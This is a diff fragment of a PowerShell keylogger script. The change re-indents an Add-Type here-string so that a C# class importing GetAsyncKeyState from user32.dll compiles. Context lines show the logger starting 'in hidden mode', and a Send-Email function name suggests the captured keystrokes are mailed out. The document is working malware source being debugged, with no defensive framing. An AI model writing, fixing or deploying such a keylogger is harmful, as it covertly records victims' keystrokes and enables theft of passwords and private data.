@@ -35,14 +35,14 @@ function Send-Email {
 function Start-KeyLogger {
     # Fix Add-Type with proper C# syntax (no space before closing @")
     Add-Type -TypeDefinition @'
-    using System;
-    using System.Runtime.InteropServices;
+using System;
+using System.Runtime.InteropServices;
 
-    public class KeyLogger {
-        [DllImport("user32.dll", SetLastError = true)]
-        public static extern short GetAsyncKeyState(int vKey);
-    }
-    '@ -Language CSharp
+public class KeyLogger {
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+'@ -Language CSharp
 
     $startTime = Get-Date
     $lastSent = $startTime
@@ -87,3 +87,4 @@ function Start-KeyLogger {
 # Start the keylogger in hidden mode
 Write-Host "Starting keylogger..."  # Debug message
 Start-KeyLogger
+
